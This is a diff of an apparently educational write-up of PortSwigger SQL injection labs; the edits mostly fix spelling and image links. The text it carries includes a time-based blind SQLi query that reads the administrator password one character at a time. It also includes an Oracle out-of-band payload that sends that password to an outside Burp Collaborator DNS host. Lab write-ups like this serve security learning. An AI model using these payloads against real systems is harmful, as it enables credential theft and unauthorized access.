@@ -203,7 +203,7 @@ Response Header:
 
 In the response header we could see names of tables that are currently available in the database:
 
-According to the previous challenge we recoginzed the table name as this `USERS_XNIZHH`:
+According to the previous challenge we recognized the table name as this `USERS_XNIZHH`:
 
 We now go further to query the available columns in that table:
 
@@ -550,9 +550,9 @@ SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{index}, 1)='{
 
 
 
-What the above sql code does is that it checks if a character exist at a particular index of the adminsitrator password column, if the statement  holds true it sleeps for 10 seconds and otherwise it doesn't sleep atall or for 0 seconds, we input this into the TrackingId feild parameter:
+What the above sql code does is that it checks if a character exist at a particular index of the administrator password column, if the statement holds true it sleeps for 10 seconds and otherwise it doesn't sleep atall or for 0 seconds, we input this into the TrackingId field parameter:
 
-![1689922680651.png](1689922680651.png)
+![1689922680651.png](https://Cyberguru1.github.io/posts/portswigger/SQL/images/1689922680651.png)
 
 we send this request and capture the response which we then filter accoring to the highest response of 10's of thousand:
 
@@ -575,7 +575,7 @@ This lab contains a blind SQL injection vulnerability. The application uses a tr
 
 The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
 
-To solve the lab, we are going to exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator, first of all we need professional burp to perform this, we right click on the burp button on the top left and select burp client then click on copy to copy the dns url, after doing that we now insert the dns url into our payload:
+To solve the lab, we are going to exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator, first we need professional burp to perform this, we right-click on the burp button on the top left and select burp client then click on copy to copy the dns url, after doing that we now insert the dns url into our payload:
 
 we use the following payload:
 
@@ -587,11 +587,11 @@ What the above injection query does is to make the sql to execute the xml code w
 
 We sent that request to the server:
 
-![1689924352388.png](1689924352388.png)
+![1689924352388.png](https://Cyberguru1.github.io/posts/portswigger/SQL/images/1689924352388.png)
 
 Response from the collaborator client, we could see that our dns url was pinged with 4 responses:
 
-![1689924405735.png](1689924405735.png)
+![1689924405735.png](https://Cyberguru1.github.io/posts/portswigger/SQL/images/1689924405735.png)
 
 
 
@@ -608,7 +608,7 @@ The database contains a different table called `users`, with columns called `use
 
  To solve the lab, log in as the `administrator` user.
 
-From our new found trick in the previous lab we could ping our dns server with the admin password, all we have to do is to append the queryed password into the subdomain of the dns url.
+From our new-found trick in the previous lab we could ping our DNS server with the admin password, all we have to do is to append the queried password into the subdomain of the dns url.
 
 Below is the used payload:
 
@@ -616,17 +616,17 @@ Below is the used payload:
 UNION SELECT EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||"{burp collaborator url here}/">+%25+remote%3b]>'),'/1')+FROM+dual--;
 ```
 
-The above payload does exactly that; appends the password to the dns query, we then send the request to the server:
+The above payload does exactly that; appends the password to the DNS query, we then send the request to the server:
 
-![1689926328502.png](1689926328502.png)
+![1689926328502.png](https://Cyberguru1.github.io/posts/portswigger/SQL/images/1689926328502.png)
 
-This the result of the ping, from the below picture we could see that the adminstrator password was appended as the subdomain, we could now use this information to login as admin.
+This the result of the ping, from the below picture we could see that the administrator password was appended as the subdomain, we could now use this information to login as admin.
 
-![1689926367132.png](1689926367132.png)
+![1689926367132.png](https://Cyberguru1.github.io/posts/portswigger/SQL/images/1689926367132.png)
 
 After logging in:
 
-![1689926474538.png](1689926474538.png)
+![1689926474538.png](https://Cyberguru1.github.io/posts/portswigger/SQL/images/1689926474538.png)
 
 
 
@@ -648,15 +648,15 @@ we got an error message from the server saying something like "injection detecte
 
 Request sent:
 
-![1689943006777.png](1689943006777.png)
+![1689943006777.png](https://Cyberguru1.github.io/posts/portswigger/SQL/images/1689943006777.png)
 
 Response recieved:
 
-![1689943038343.png](1689943038343.png)
+![1689943038343.png](https://Cyberguru1.github.io/posts/portswigger/SQL/images/1689943038343.png)
 
 using the above information to login :
 
-![1689943075984.png](1689943075984.png)
+![1689943075984.png](https://Cyberguru1.github.io/posts/portswigger/SQL/images/1689943075984.png)
 
 COMMENTS AND REMARKS:
 
